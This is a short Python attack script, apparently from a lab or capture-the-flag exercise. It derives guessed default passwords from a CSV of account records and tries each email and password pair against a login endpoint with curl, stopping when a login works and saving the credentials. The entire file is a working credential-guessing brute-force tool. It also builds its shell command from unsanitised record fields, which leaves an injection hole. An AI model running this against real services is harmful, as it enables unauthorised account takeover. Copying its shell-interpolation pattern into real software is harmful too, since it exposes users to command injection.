#!/usr/bin/python3

import os, re, sys,csv, json, subprocess
from threading import activeCount
import pandas as pd
import requests


def getCreds():
    acc = pd.read_csv('records.csv', keep_default_na=False, na_filter=False).set_index('id').to_dict('index')  #dont forget to change path/file name for each line
    # login uses email w/ 'default' pwd created at accout creation
    # pwd is username.initials+account ID
    possCreds = dict()
    for a in acc:
        email = acc[a]['email']
        fn,ln = acc[a]['name'].split()  # get first & last name
        pwd = acc[a]['username']+'.'+fn[0]+ln[0]+str(a) 
        possCreds[email] = pwd.strip('\n')

    with open('possWebCreds.txt','w+') as f:
        for e,p in possCreds.items():
            f.write(e+':'+p+'\n')
            
    return possCreds
    #pd.DataFrame.from_dict(records, orient='index').to_csv('sanitized.csv',index_label='index') #writes to new csv if wanted

def bruteForce(creds):
    for k,v in creds.items():
        res = subprocess.run(f"curl -d 'email={k}&password={v}' http://services/login",shell=True,capture_output=True).stdout.decode('utf-8').strip('\n')
        if 'Incorrect login' not in res:
            with open('webCredentials.txt', 'w+') as f:
                f.write(k+':'+v)
            print(f"Correct credentials found:\nEmail = {k}\npassword={v}")
            break

if __name__=='__main__':
    creds = getCreds()
    bruteForce(creds)
